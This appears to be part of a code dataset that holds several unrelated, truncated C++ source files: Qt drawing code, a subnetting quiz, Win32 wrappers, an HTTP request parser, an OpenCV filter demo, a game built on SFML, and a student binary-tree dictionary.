transparentBrushColor{Qt::transparent};\r\n\tconst QSizeF informationElement{mElementSize.width(), 22.0};\r\n\r\n\tQBrush notColoredBrushColor{mBrush};\r\n\tnotColoredBrushColor.setColor(Qt::lightGray);\r\n\r\n\tQPen informationElementFont(mColored ? mPen : notColoredPenColor);\r\n\tinformationElementFont.setColor(mColored ? Qt::white : Qt::lightGray);\r\n\r\n\tQPointF position(0.0, mSize.height() - informationElement.height());\r\n\r\n\tpainter->setFont(QFont(QStringLiteral(\"Courier New\"), 16, QFont::Normal));\r\n\tpainter->setPen(informationElementFont);\r\n\tpainter->setBrush(transparentBrushColor);\r\n\tpainter->drawStaticText(position, mIndex);\r\n\r\n\tQPen informationElementRectPen{mPen};\r\n\r\n\tif(mColored)\r\n\t{\r\n\t\tinformationElementRectPen.setColor(mBrush.color());\r\n\t}\r\n\telse\r\n\t{\r\n\t\tinformationElementRectPen.setColor(Qt::lightGray);\r\n\t}\r\n\r\n\tpainter->setPen(informationElementRectPen);\r\n\tposition.setY(position.y() - (informationElement.height() + 5.0));\r\n\tpainter->drawRect(QRectF(position, informationElement));\r\n\tpainter->setPen(informationElementFont);\r\n\tpainter->drawText(QRectF(position, informationElement), Qt::AlignCenter, QString::number(mValue));\r\n\tpainter->setPen(mColored ? mPen : notColoredPenColor);\r\n\tposition.setY(position.y() - (mElementSize.height() + 8.0));\r\n\r\n\tfor(auto i{0}; i < mMaxValue; ++i)\r\n\t{\r\n\t\tif(i < mValue)\r\n\t\t{\r\n\t\t\tpainter->setBrush(mColored ? mBrush : notColoredBrushColor);\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tpainter->setBrush(transparentBrushColor);\r\n\t\t}\r\n\r\n\t\tpainter->drawRect(QRectF(position, mElementSize));\r\n\t\tposition.setY(position.y() - (mElementSize.height() + mSpacing));\r\n\t}\r\n}\r\n",
    "#include <iostream>\r\n#include <string>\r\n#include <cmath>\r\nusing namespace std;\r\n\r\nstring findWhat;//quiz1, quiz2\r\nstring ip4, findClass;\r\nstring subnetMask ,firstAvailableHostAddressofSubnet1, MaxNOfhostsSubnet;\r\nstring findSM, partOfSM;\r\nstring slash, NA, BA;\r\nint first, second, third, fourth;\r\nlong long subnetsRequired, n, ipSize, cntOf255, hostLeft, availableHosts, range;\r\nint afterSlash, bit, period, forSubnett;\r\nint networkAddress, x;\r\n\r\nstring nTimesOne(int n) {\r\n    int zerosLeft = 8 - n;\r\n    string ans = \"\";\r\n    while(n > 0) {\r\n        ans += \"1\";\r\n        n--;\r\n    }\r\n\r\n    while (zerosLeft > 0) {\r\n        ans += \"0\";\r\n        zerosLeft--;\r\n    }\r\n\r\n    return ans;\r\n}\r\n\r\nstring binToDec(string s) {\r\n    int k, x, ans = 0, i;\r\n    string stAns = \"\";\r\n        k = s.size();\r\n        x = k - 1;\r\n        for(i = 0; i < k; i++) {\r\n            ans += (s[i]-48) * pow(2,x);\r\n            x--;\r\n        }\r\n\r\n        stAns = to_string(ans);\r\n\r\n        return stAns;\r\n}\r\n\r\n\r\nint main() {\r\n    cout << \"Subnetting Quiz1 : quiz1 \\nSubnetting Quiz2 : quiz2 \\n\";\r\n\r\n    cin >> findWhat;\r\n\r\n    if(findWhat == \"quiz1\") {\r\n        cout << \"Insert IPv4 address: \";\r\n        cin >> ip4;\r\n\r\n        cout << \"Insert Subnets required: \";\r\n        cin >> subnetsRequired;\r\n\r\n        n = log2(subnetsRequired);\r\n\r\n        if(pow(2,n) < subnetsRequired) n++;\r\n\r\n        cout << endl << endl << \"n-times one for S/M: \" << n << endl;\r\n        hostLeft = 8 - n;\r\n        cout << \"n-times zero for Hosts: \" << hostLeft << endl;\r\n        //octets\r\n        int k = 0;\r\n        ipSize = ip4.size();\r\n\r\n        while(ip4[k] != '.') {\r\n            first = first * 10 + ip4[k] - 48;\r\n            k++;\r\n        } k++;\r\n\r\n        while (ip4[k] != '.') {\r\n            second = second * 10 + ip4[k] - 48;\r\n            k++;\r\n        } k++;\r\n\r\n        while (ip4[k] != '.') {\r\n            third = third * 10 + ip4[k] - 48;\r\n            k++;\r\n        } k++;\r\n\r\n        while (k < ipSize) {\r\n            fourth = fourth * 10 + ip4[k]-48;\r\n            k++;\r\n        }\r\n\r\n        cout << \"Network: \" << first << '.' << second << '.' << third << '.' << fourth << endl;\r\n        //find class    A B C\r\n\r\n        if(first > 0 && first < 127) {\r\n            // cout << \"Class: A\\n\";\r\n            cntOf255 = 1; \r\n            findClass = \"A\";\r\n        }\r\n        else if(first > 127 && first < 192) {\r\n            // cout << \"Class: B\\n\"; \r\n            cntOf255 = 2; \r\n            findClass = \"B\";\r\n        }\r\n        else {\r\n            // cout << \"Class: C\\n\"; \r\n            cntOf255 = 3; findClass = \"C\";\r\n        }\r\n\r\n        k = 4;//for S/M, if cntOf255=3 then there is one zero left, so k should be equal to 4 for while loop\r\n        k -= cntOf255;\r\n\r\n        while (cntOf255 > 0) {\r\n            subnetMask += \"255.\";\r\n            cntOf255--;\r\n        }\r\n\r\n        findSM = nTimesOne(n);\r\n        // cout << \"FORSUBNETTTTT: \" << findSM << endl;\r\n        partOfSM = binToDec(findSM);\r\n        // cout << partOfSM << endl;\r\n        subnetMask += partOfSM + \".\";\r\n\r\n        k--;\r\n        while (k > 0) {\r\n            subnetMask += \"0.\";\r\n            k--;\r\n        }\r\n\r\n        subnetMask = subnetMask.substr(0, subnetMask.size() - 1);//silamazistvis\r\n        cout << \"\\n\\n\\t Subnet Mask: \" << subnetMask << endl;\r\n\r\n        //first available host\r\n        range = pow(2,hostLeft);\r\n\r\n        if(findClass == \"A\") {\r\n            firstAvailableHostAddressofSubnet1 = to_string(first) + \".\" + to_string(range) + \".\" + to_string(third) + \".\" + to_string(fourth+1);\r\n        } else if(findClass == \"B\") {\r\n            firstAvailableHostAddressofSubnet1 = to_string(first) + \".\" + to_string(second) + \".\" + to_string(range) + \".\" + to_string(fourth+1);\r\n        } else {\r\n            firstAvailableHostAddressofSubnet1 = to_string(first) + \".\" + to_string(second) + \".\" + to_string(third) + \".\" + to_string(range+1);\r\n        }\r\n        \r\n        cout << \"\\t 1st Available Host Address of Subnet 1: \" << firstAvailableHostAddressofSubnet1 << endl;\r\n\r\n        //number of hosts\r\n        if(findClass == \"A\") {\r\n            availableHosts = ( 256 - stoi(partOfSM)) * 256 * 256;\r\n        }else if(findClass == \"B\") {\r\n            availableHosts = ( 256 - stoi(partOfSM)) * 256;\r\n        } else {\r\n            availableHosts = 256 - stoi(partOfSM);\r\n        }\r\n\r\n        availableHosts -= 2;    MaxNOfhostsSubnet = to_string(availableHosts);\r\n        cout << \"\\t Max # of hosts/subnet: \" << MaxNOfhostsSubnet << endl;\r\n\r\n    } else {\r\n\r\n        cout << \"Insert IPv4 Address with it's mask (/24): \";\r\n        cin >> ip4 >> slash;\r\n        int k = 0;\r\n        ipSize = ip4.size();\r\n\r\n        while(ip4[k] != '.') {\r\n            first = first * 10 + ip4[k] - 48;\r\n            k++;\r\n        } k++;\r\n\r\n        while (ip4[k] != '.') {\r\n            second = second * 10 + ip4[k] - 48;\r\n            k++;\r\n        } k++;\r\n\r\n        while (ip4[k] != '.') {\r\n            third = third * 10 + ip4[k] - 48;\r\n            k++;\r\n        } k++;\r\n\r\n     ",
    "#include <Wx32/Private/WxKernel32.h>\n\nnamespace Wx32::Kernel32\n{\nauto GetModuleFileNameU8(HMODULE hModule) -> MbcsStr_t\n{\n    uint32_t written_chars{};\n    uint32_t buffer_max_chars = MAX_PATH;\n    std::unique_ptr<wchar_t[]> buffer;\n    do\n    {\n        buffer_max_chars *= 2;\n        buffer = std::make_unique_for_overwrite<wchar_t[]>(buffer_max_chars);\n        written_chars = ::GetModuleFileNameW(hModule, buffer.get(), buffer_max_chars);\n    } while (written_chars >= buffer_max_chars);\n\n    return Utils::ApiStrCvt({ buffer.get(), written_chars });\n}\n\nauto GetCurrentDirectoryU8() -> MbcsStr_t\n{\n    uint32_t real_chars{};\n    uint32_t buffer_max_chars = MAX_PATH;\n    std::unique_ptr<wchar_t[]> buffer;\n\n    buffer = std::make_unique_for_overwrite<wchar_t[]>(buffer_max_chars);\n    real_chars = ::GetCurrentDirectoryW(buffer_max_chars, buffer.get());\n\n    if (real_chars > buffer_max_chars)\n    {\n        buffer_max_chars = real_chars;\n        buffer = std::make_unique_for_overwrite<wchar_t[]>(buffer_max_chars);\n        real_chars = ::GetCurrentDirectoryW(buffer_max_chars, buffer.get());\n    }\n\n    return Utils::ApiStrCvt({ buffer.get(), real_chars });\n}\n\nauto CreateFileU8(const std::string_view u8FilePath, CreateFileU8_Property Properties) -> std::optional<SysID>\n{\n    const auto hfile = ::CreateFileW(\n        Utils::ApiStrCvt(u8FilePath).first.data(), \n        static_cast<DWORD>(Properties.dwDesiredAccess), \n        static_cast<DWORD>(Properties.dwShareMode), \n        Properties.lpSecurityAttributes, \n        static_cast<DWORD>(Properties.dwCreationDisposition), \n        static_cast<DWORD>(Properties.dwFlagsAndAttributes), \n        Properties.hTemplateFile);\n    return (hfile != INVALID_HANDLE_VALUE) ? std::optional<SysID>{ hfile } : std::nullopt;\n}\n\nauto WriteFile(SysID hFile, std::span<const uint8_t> spData, LPOVERLAPPED lpOverlapped) -> std::optional<size_t>\n{\n    DWORD written{};\n    bool status = (::WriteFile(hFile, spData.data(), static_cast<DWORD>(spData.size_bytes()), &written, lpOverlapped) != FALSE);\n    return status ? std::optional<size_t>{ static_cast<size_t>(written) } : std::nullopt;\n}\n\nauto ReadFile(SysID hFile, std::span<uint8_t> spBuffer, LPOVERLAPPED lpOverlapped) -> std::optional<size_t>\n{\n    DWORD read{};\n    bool status = (::ReadFile(hFile, spBuffer.data(), static_cast<DWORD>(spBuffer.size_bytes()), &read, lpOverlapped) != FALSE);\n    return status ? std::optional<size_t>{ static_cast<size_t>(read) } : std::nullopt;\n}\n\nauto GetFileSizeEx(SysID hFile) -> std::optional<uint64_t>\n{\n    LARGE_INTEGER file_size{};\n    ::GetFileSizeEx(hFile, &file_size);\n    return static_cast<uint64_t>(file_size.QuadPart);\n}\n\nauto SetFilePointerEx(SysID hFile, uint64_t nOffset, MoveWayEnum eMoveWay) -> std::optional<uint64_t>\n{\n    LARGE_INTEGER new_file_pointer;\n    LARGE_INTEGER move_distance = { .QuadPart = static_cast<LONGLONG>((nOffset)) };\n    bool status = (::SetFilePointerEx(hFile, move_distance, &new_file_pointer, static_cast<DWORD>(eMoveWay)) != FALSE);\n    return status ? std::optional<uint64_t>{ static_cast<uint64_t>(new_file_pointer.QuadPart) } : std::nullopt;\n}\n\nauto CloseHandle(SysID hFile) -> bool\n{\n    return ::CloseHandle(hFile) != FALSE;\n}\n\nauto FlushFileBuffers(SysID hFile) -> bool\n{\n    return ::FlushFileBuffers(hFile) != FALSE;\n}\n\nauto CreateDirectoryU8(const std::string_view u8DirName, LPSECURITY_ATTRIBUTES lpSecurityAttributes) -> bool\n{\n    return ::CreateDirectoryW(Utils::ApiStrCvt(u8DirName).first.data(), lpSecurityAttributes) != FALSE;\n}\n\nauto RemoveDirectoryU8(const std::string_view u8DirName) -> bool\n{\n    return ::RemoveDirectoryW(Utils::ApiStrCvt(u8DirName).first.data()) != FALSE;\n}\n\nauto GetFileAttributesU8(const std::string_view u8Path) -> size_t\n{\n    return ::GetFileAttributesW(Utils::ApiStrCvt(u8Path).first.data());\n}\n\nauto DeleteFileU8(const std::string_view u8FilePath) -> bool\n{\n    return ::DeleteFileW(Utils::ApiStrCvt(u8FilePath).first.data()) != FALSE;\n}\n\nauto CopyFileU8(const std::string_view u8ExistFilePath, const std::string_view u8NewFilePath, bool bFailIfExists) -> bool\n{\n    return ::CopyFileW(Utils::ApiStrCvt(u8ExistFilePath).first.data(), Utils::ApiStrCvt(u8NewFilePath).first.data(), bFailIfExists ? TRUE : FALSE) != FALSE;\n}\n\nauto MoveFileU8(const std::string_view u8ExistFilePath, const std::string_view u8NewFilePath) -> bool\n{\n    return ::MoveFileW(Utils::ApiStrCvt(u8ExistFilePath).first.data(), Utils::ApiStrCvt(u8NewFilePath).first.data()) != FALSE;\n}\n\nauto GetStdHandle(STDHandleEnum eHandle) -> std::optional<SysID>\n{\n    const auto handle = ::GetStdHandle(static_cast<DWORD>(eHandle));\n    return ((handle != INVALID_HANDLE_VALUE) && (handle != 0)) ? std::optional<SysID>{ handle } : std::nullopt;\n}\n\nauto WriteConsoleU8(SysID hConsoleOutput, const std::string_view u8Text, void* lpReserved) -> std::optional<size_t>\n{\n    DWORD written{};\n    auto text_wstr = Utils::ApiStrCvt(u8Text);\n    bool status = (::WriteConsoleW(hConsoleOutput, text_wstr.first.data(), stati",
    "//\n// Created by pyq on 5/10/24.\n//\n#include \"http_request.h\"\n\nconst std::unordered_set<std::string> HttpRequest::DEFAULT_HTML = {\n    \"/index\",\n    \"/register\",\n    \"/login\",\n    \"/welcome\",\n    \"/video\",\n    \"/picture\",\n};\n\nconst std::unordered_map<std::string, int> HttpRequest::DEFAULT_HTML_TAG = {\n    {\"/register.html\", 0},\n    {\"/login.html\", 1},\n};\n\nvoid HttpRequest::Init() {\n    method_ = path_ = version_ = body_ = \"\";\n    state_ =  REQUEST_LINE;\n    header_.clear();\n    post_.clear();\n}\n\nstd::string HttpRequest::Path() const {\n    return path_;\n}\n\nstd::string& HttpRequest::Path() {\n    return path_;\n}\n\nstd::string HttpRequest::Method() const {\n    return method_;\n}\n\nstd::string HttpRequest::Version() const {\n    return version_;\n}\n\nstd::string HttpRequest::GetPost(const std::string& key) const {\n    assert(key != \"\");\n    if (post_.count(key) > 0) {\n        return post_.find(key)->second;\n    }\n    return \"\";\n}\n\nstd::string HttpRequest::GetPost(const char* key) const {\n    assert(key && key[0] != '\\0');\n    if (post_.count(key) > 0) {\n        return post_.find(key)->second;\n    }\n    return \"\";\n}\n\nbool HttpRequest::IsKeepAlive() const {\n    if (header_.count(\"Connection\") > 0) {\n        return header_.find(\"Connection\")->second == \"keep-alive\" && version_ == \"1.1\"; \n    }\n    return false;\n}\n\nbool HttpRequest::ParseHttpRequest(Buffer& buff) {\n    const char CRLF[] = \"\\r\\n\";\n    if (buff.GetReadableBytes() <= 0) {\n        return false;\n    }\n    while (buff.GetReadableBytes() && state_ != FINISH) {\n        // lineEnd is a pointer to the beginning of the found CRLF sequence in buffer. \n        // If not found, lineEnd will point to the return value of buff.BeginWriteConst().\n        const char* lineEnd = std::search(buff.BeginRead(), buff.BeginWriteConst(), CRLF, CRLF + 2);\n\n        // line contains all characters from the beginning of the buffer to the first CRLF, excluding the CRLF itself.\n        // parse the request according to state_\n        std::string line(buff.BeginRead(), lineEnd);\n        switch (state_) {\n            case REQUEST_LINE:\n                if (!ParseRequestLine_(line)) {\n                    return false;\n                }\n                ParsePath_();\n                break;\n            case HEADER:\n                ParseHeader_(line);\n                if (buff.GetReadableBytes() <= 2) {\n                    state_ = FINISH;\n                }\n                break;\n            case BODY:\n                ParseBody_(line);\n                break;\n            default:\n                break;\n        }\n        if (lineEnd == buff.BeginWrite()) {\n            if(method_==\"POST\"&&state_==FINISH){\n                buff.AdvanceReadPointer(lineEnd - buff.BeginRead());\n            }\n            break;\n        }\n        buff.AdvanceReadPointer(lineEnd + 2 - buff.BeginRead());\n    }\n    LOG_DEBUG(\"[%s], [%s], [%s]\", method_.c_str(), path_.c_str(), version_.c_str());\n    return true;\n}\n\nbool HttpRequest::ParseRequestLine_(const std::string& line) {\n    // use regular expressions to match and parse HTTP request lines\n    // \"GET /index.html HTTP/1.1\" eg. \n    std::regex pattern(\"^([^ ]*) ([^ ]*) HTTP/([^ ]*)$\");\n    std::smatch subMatch;\n    // subMatch[0] stores the complete string matched by the entire expression \n    if (std::regex_match(line, subMatch, pattern)) {\n        method_ = subMatch[1];\n        path_ = subMatch[2];\n        version_ = subMatch[3];\n        state_ = HEADER;\n        return true;\n    }\n    LOG_ERROR(\"Parse RequestLine Error!\");\n    return false;\n}\n\nvoid HttpRequest::ParsePath_() {\n    if (path_ == \"/\") {\n        path_ = \"/index.html\";\n    } else {\n        for (auto &item : DEFAULT_HTML) {\n            if (path_ == item) {\n                path_ += \".html\";\n                break;\n            }\n        }\n    }\n}\n\nvoid HttpRequest::ParseHeader_(const std::string& header) {\n    // use regular expressions to parse a single header line in an HTTP request. \n    // separate the key and value of the header and store them in a map.\n    // Host: www.example.com\n    // Content-Type: application/x-www-form-urlencoded\n    // Content-Length: 27 \n    // eg.\n    std::regex pattern(\"^([^:]*): ?(.*)$\");\n    std::smatch subMatch;\n    if (std::regex_match(header, subMatch, pattern)) {\n        header_[subMatch[1]] = subMatch[2];\n    } else {\n        state_ = BODY;\n    }\n}\n\nvoid HttpRequest::ParseBody_(const std::string& body) {\n    body_ = body;\n    ParsePostBody_();\n    state_ = FINISH;\n    LOG_DEBUG(\"RequestBody:%s, Len:%d\", body.c_str(), body.size());\n}\n\nvoid HttpRequest::ParsePostBody_() {\n    if (method_ == \"POST\" && header_[\"Content-Type\"] == \"application/x-www-form-urlencoded\") {\n        ParseFromUrlEncoded_();\n        if (DEFAULT_HTML_TAG.count(path_)) {\n            int tag = DEFAULT_HTML_TAG.find(path_)->second;\n            LOG_DEBUG(\"Tag:%d\", tag);\n            if (tag == 0 || tag == 1) {\n                bool isLogin = (tag == 1);\n                if (UserVerify(post_[\"username\"], post_[\"pas",
    "#include <omp.h>\n#include <opencv2/opencv.hpp>\n#include <iostream>\n#include <chrono>\n#include \"image_processing.h\"\n#include <stdio.h>\n#include <stdlib.h>\n\nusing namespace cv;\nusing namespace std;\nusing namespace chrono;\n\nint main(int argc, char* argv[]) {\n    VideoCapture cap(0);\n\n    if (!cap.isOpened()) {\n        cout << \"Cannot open the video camera\" << endl;\n        return -1;\n    } \n\n    double dWidth = cap.get(CAP_PROP_FRAME_WIDTH);\n    double dHeight = cap.get(CAP_PROP_FRAME_HEIGHT);\n\n    cout << \"Resolution of the video : \" << dWidth << \" x \" << dHeight << endl;\n\n    Mat input_frame, output_frame;\n    int d = 20;\n    double sigmaColor = 80;\n    double sigmaSpace = 80;\n\n    #pragma omp parallel\n    {\n \n        printf(\"Hello World... from thread = %d\\n\",\n               omp_get_thread_num());\n    }\n\n\n    while (true) {\n        cap >> input_frame;\n\n        if (input_frame.empty()) {\n            cout << \"Failed to capture frame\" << endl;\n            break;\n        }\n\n        auto start = high_resolution_clock::now();\n\n        output_frame = input_frame.clone();\n        cout << input_frame.rows << input_frame.cols << endl;\n\n        omp_set_num_threads(6);\n        #pragma omp parallel for\n            for (int i = 0; i < input_frame.rows; i += 100) {\n                for (int j = 0; j < input_frame.cols; j += 100) {\n                    Rect block(j, i, min(100, input_frame.cols - j), min(100, input_frame.rows - i));\n                    bilateralFilter(input_frame(block), output_frame(block), d, sigmaColor, sigmaSpace);\n                    // printf(\"Hello World... from thread = %d\\n\", omp_get_thread_num());\n                }\n            }\n        \n        bilateralFilter(input_frame, output_frame, d, sigmaColor, sigmaSpace);\n\n        auto stop = high_resolution_clock::now();\n        auto duration = duration_cast<milliseconds>(stop - start);\n        double fps = 1000.0 / duration.count();\n\n        stringstream ss;\n        ss << \"FPS: \" << fps;\n        putText(output_frame, ss.str(), Point(10, 30), FONT_HERSHEY_SIMPLEX, 1, Scalar(0, 255, 0), 2);\n\n        imshow(\"Output\", output_frame);\n\n        if (waitKey(10) == 27) {\n            cout << \"Esc key is pressed by user. Stopping the video\" << endl;\n            break;\n        }\n    }\n\n    destroyAllWindows();\n    return 0;\n}\n",
    "#include \"ndq/rhi.h\"\n#include \"ndq/window.h\"\n\n#include \"ndq_internal.h\"\n\nnamespace Internal\n{\n    LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)\n    {\n        LRESULT Result;\n\n        switch (message)\n        {\n        case WM_DESTROY:\n            PostQuitMessage(0);\n            Result = 0;\n            break;\n        default:\n            Result = DefWindowProcW(hWnd, message, wParam, lParam);\n            break;\n        }\n\n        return Result;\n    }\n\n    float GetElapsedTime(LARGE_INTEGER& frequency, LARGE_INTEGER& lastTime)\n    {\n        LARGE_INTEGER CurrentTime;\n        QueryPerformanceCounter(&CurrentTime);\n        float ElapsedTime = static_cast<float>(CurrentTime.QuadPart - lastTime.QuadPart) / frequency.QuadPart;\n        lastTime = CurrentTime;\n        return ElapsedTime;\n    }\n}\n\nnamespace ndq\n{\n    int IApplication::Run()\n    {\n        WNDCLASSEXW Wcex{};\n        Wcex.cbSize = sizeof(WNDCLASSEXW);\n        Wcex.style = CS_HREDRAW | CS_VREDRAW;\n        Wcex.lpfnWndProc = Internal::WndProc;\n        Wcex.hInstance = GetModuleHandleW(nullptr);\n        Wcex.hIcon = LoadIconW(Wcex.hInstance, L\"IDI_ICON\");\n        Wcex.hCursor = LoadCursorW(nullptr, MAKEINTRESOURCEW(32512));\n        Wcex.hbrBackground = reinterpret_cast<HBRUSH>(COLOR_WINDOW + 1);\n        Wcex.lpszClassName = L\"ndq\";\n        Wcex.hIconSm = LoadIconW(Wcex.hInstance, L\"IDI_ICON\");\n        RegisterClassExW(&Wcex);\n\n        auto Stype = WS_OVERLAPPEDWINDOW ^ WS_THICKFRAME ^ WS_MAXIMIZEBOX;\n        RECT RC = { 0, 0, static_cast<LONG>(Width), static_cast<LONG>(Height) };\n        AdjustWindowRect(&RC, Stype, FALSE);\n        auto hwnd = CreateWindowExW(0, L\"ndq\", Title, Stype, CW_USEDEFAULT, CW_USEDEFAULT, RC.right - RC.left, RC.bottom - RC.top, nullptr, nullptr, Wcex.hInstance, nullptr);\n        ShowWindow(hwnd, SW_SHOWDEFAULT);\n        UpdateWindow(hwnd);\n\n        auto TempPtr = dynamic_cast<Internal::GraphicsDeviceInterface*>(ndq::GetGraphicsDevice().get());\n        TempPtr->Initialize(hwnd, Width, Height);\n\n        Initialize();\n\n        LARGE_INTEGER Frequency;\n        LARGE_INTEGER LastTime;\n        QueryPerformanceFrequency(&Frequency);\n        QueryPerformanceCounter(&LastTime);\n\n        MSG Msg = {};\n        while (WM_QUIT != Msg.message)\n        {\n            if (PeekMessageW(&Msg, nullptr, 0, 0, PM_REMOVE))\n            {\n                TranslateMessage(&Msg);\n                DispatchMessageW(&Msg);\n            }\n            else\n            {\n                auto ElapsedTime = Internal::GetElapsedTime(Frequency, LastTime);\n                Update(ElapsedTime);\n                //\n                TempPtr->Present();\n                TempPtr->RunGarbageCollection();\n            }\n        }\n\n        Finalize();\n\n        TempPtr->Release();\n        return static_cast<int>(Msg.wParam);\n    }\n}\n",
    "#include <SFML/Graphics.hpp>\r\n#include <ctime>\r\n#include <iostream>\r\n\r\nusing namespace sf;\r\nusing namespace std;\r\n\r\nclass Plants\r\n{\r\nprotected:\r\n    int health;\r\n    int cost;\r\n\r\npublic:\r\n    Plants(int h, int c) : health(h), cost(c) {}\r\n\r\n    virtual void setPosition(float x, float y) = 0;\r\n    virtual void setTexture(const sf::Texture& texture) = 0;\r\n    virtual void draw(sf::RenderWindow& window) = 0;\r\n};\r\n\r\n\r\nclass Pea {\r\n    sf::Sprite sprite;\r\n    sf::Texture texture;\r\n    float speed;\r\n    bool active;  // To track if the pea is active and should be moved or drawn\r\n\r\npublic:\r\n    Pea() : speed(150.0f), active(false) {}\r\n\r\n    void activate(float x, float y) {\r\n        if (!texture.loadFromFile(\"Images/pea.png\")) {\r\n            std::cerr << \"Failed to load pea image\" << std::endl;\r\n        }\r\n        sprite.setTexture(texture);\r\n        sprite.setPosition(x, y);\r\n        active = true;\r\n    }\r\n\r\n    void update(float deltaTime) {\r\n        if (active) {\r\n            sprite.move(speed * deltaTime, 0); // Move right\r\n            if (sprite.getPosition().x > 1200) { // Assuming screen width is 1200\r\n                active = false;  // Deactivate if off screen\r\n            }\r\n        }\r\n    }\r\n\r\n    void draw(sf::RenderWindow& window) {\r\n        if (active) {\r\n            window.draw(sprite);\r\n        }\r\n    }\r\n\r\n    bool isActive() const {\r\n        return active;\r\n    }\r\n};\r\n\r\n\r\n\r\n\r\nclass Peashooter : public Plants\r\n{\r\n    sf::Sprite sprite;\r\n    sf::Texture texture;\r\n\r\n    Pea peas[40];  // Array of peas, assuming a max of 10 active peas at a time\r\n    float shootTimer;\r\n    const float shootInterval = 5.0f; // 8 seconds interval\r\n\r\npublic:\r\n    // Default constructor\r\n    Peashooter() : Plants(0, 0) {}\r\n\r\n    // Constructor with parameters for texture and position\r\n    Peashooter(const std::string& textureFile, float x, float y, int h = 0, int c = 0) : Plants(h, c)\r\n    {\r\n        if (!texture.loadFromFile(textureFile)) {\r\n            cerr << \"Failed to load peashooter image\" << endl;\r\n        }\r\n        sprite.setTexture(texture);\r\n        sprite.setPosition(x, y);\r\n        shootTimer = shootInterval;\r\n    }\r\n\r\n    void setPosition(float x, float y) override {\r\n        sprite.setPosition(x, y);\r\n    }\r\n\r\n    void setTexture(const sf::Texture& texture) override {\r\n        sprite.setTexture(texture);\r\n    }\r\n\r\n    void update(float deltaTime) {\r\n        // Shooting logic\r\n        if ((shootTimer -= deltaTime) <= 0) {\r\n            for (int i = 0; i < 40; i++) {\r\n                if (!peas[i].isActive()) {\r\n                    peas[i].activate(sprite.getPosition().x + sprite.getGlobalBounds().width,\r\n                        sprite.getPosition().y + sprite.getGlobalBounds().height / 2);\r\n                    break;\r\n                }\r\n            }\r\n            shootTimer = shootInterval;\r\n        }\r\n\r\n        // Update each active pea\r\n        for (int i = 0; i < 40; i++) {\r\n            peas[i].update(deltaTime);\r\n        }\r\n    }\r\n\r\n    void draw(sf::RenderWindow& window) {\r\n        window.draw(sprite);\r\n        for (int i = 0; i < 40; i++) {\r\n            peas[i].draw(window);\r\n        }\r\n    }\r\n\r\n    Vector2f getPosition() const {\r\n        return sprite.getPosition();\r\n    }\r\n};\r\n\r\n\r\n\r\nclass Sun {\r\n    sf::Sprite sprite;\r\n    sf::Texture texture;\r\n    bool active;\r\n    float timer;\r\n\r\npublic:\r\n    Sun() : active(false), timer(0) {}\r\n\r\n    void activate(float x, float y) {\r\n        if (!texture.loadFromFile(\"Images/sun.png\")) {\r\n            std::cerr << \"Failed to load sun image\" << std::endl;\r\n        }\r\n        active = true;\r\n        sprite.setTexture(texture);\r\n        sprite.setPosition(x, y + 20); // Position the sun slightly above the sunflower\r\n        timer = 10.0f; // Resets the timer for the next sun generation\r\n    }\r\n\r\n    void update(float deltaTime) {\r\n        if (active) {\r\n            timer -= deltaTime;\r\n            if (timer <= 8) {\r\n                active = false; // Automatically deactivate after 10 seconds if not clicked\r\n            }\r\n        }\r\n    }\r\n\r\n    void draw(sf::RenderWindow& window) {\r\n        if (active) {\r\n            window.draw(sprite);\r\n        }\r\n    }\r\n\r\n    bool contains(float x, float y) {\r\n        return sprite.getGlobalBounds().contains(x, y);\r\n    }\r\n\r\n    bool isActive() const {\r\n        return active;\r\n    }\r\n\r\n    void deactivate() {\r\n        active = false;\r\n    }\r\n};\r\n\r\n\r\n\r\n\r\nclass Sunflower : public Plants {\r\n    sf::Sprite sprite;\r\n    sf::Texture texture;\r\n    Sun sun; // Each sunflower has one sun at a time\r\n    int* currencyPtr;  // Pointer to the currency in the Game class\r\n    float generateSunTimer;  // Timer for generating suns\r\n\r\npublic:\r\n    // Default constructor\r\n\r\n    Sunflower() : Plants(0, 0), generateSunTimer(10.0f), currencyPtr(NULL) {}\r\n\r\n    Sunflower(const std::string& textureFile, float x, float y, int h, int c, int* Currency) : Plants(h, c), generateSunTimer(10.0f), currencyPtr(Currency) {\r\n        if (!texture.loadFromFile(textureFi",
    "/*\r\nPractical No:09\r\nTitle: A C++ Program to Implement Dictionary using Height-Balanced Tree.\r\n Input: Keywords and Meanings\r\n Output:\r\n a) Store Keywords and Meanings in Height-Balanced Tree.\r\n b) Display Keywords and Meanings in Height-Balanced Tree.\r\n c) Display a Sorted List of Keywords and Meanings.\r\n d) Display Number of Comparisons required to find a keyword.\r\n*/\r\n \r\n#include <iostream>\r\nusing namespace std;\r\nstruct HBTNode\r\n{\r\n int Key;\r\n char Mean[10];\r\n\r\n HBTNode *left;\r\n HBTNode *right;\r\n}*Root;\r\n \r\nvoid create_HBT()\r\n{\r\n int i;\r\n int nodes;\r\n int done;\r\n struct HBTNode *Newnode, *current;\r\n\r\n cout<<\"\\n\\n Enter the no of nodes to insert in HBT.? : \";\r\n cin>>nodes;\r\n\r\n for(i=0; i<nodes; i++)\r\n {\r\n Newnode = new struct HBTNode; \r\n\r\n cout<<\"\\n\\t Enter Keyword: \"; \r\n cin>>Newnode->Key;\r\n cout<<\"\\n\\t Enter Meaning: \"; \r\n cin>>Newnode->Mean;\r\n Newnode->left = NULL; \r\n Newnode->right = NULL;\r\n\r\n if(Root == NULL)\r\n {\r\n Root = Newnode;\r\n }\r\n else\r\n {\r\n done = 0;\r\n current = Root;\r\n while(!done)\r\n {\r\n if(Newnode->Key < current->Key)\r\n {\r\n if(current->left == NULL)\r\n {\r\n current->left = Newnode;\r\n done = 1;\r\n }\r\n else\r\n current = current->left;\r\n }\r\n else\r\n {\r\n if(current->right == NULL)\r\n {\r\n current->right = Newnode;\r\n done = 1;\r\n }\r\n else\r\n current = current->right;\r\n }\r\n }\r\n\r\n }\r\n\r\n }\r\n\r\n}\r\n\r\n \r\nvoid display_HBT(struct HBTNode *root)\r\n{\r\n if(root) \r\n {\r\n cout<<\"\\n\\t\"<<root->Key<<\" - \"<<root->Mean; //...Data\r\n display_HBT(root->left); //...Left\r\n display_HBT(root->right); //...Right\r\n }\r\n}\r\nvoid Sorted_List(struct HBTNode *root)\r\n{\r\n if(root) \r\n {\r\n Sorted_List(root->left); //...Left\r\n cout<<\"\\n\\t\"<<root->Key<<\" - \"<<root->Mean; //...Data\r\n Sorted_List(root->right); //...Right\r\n 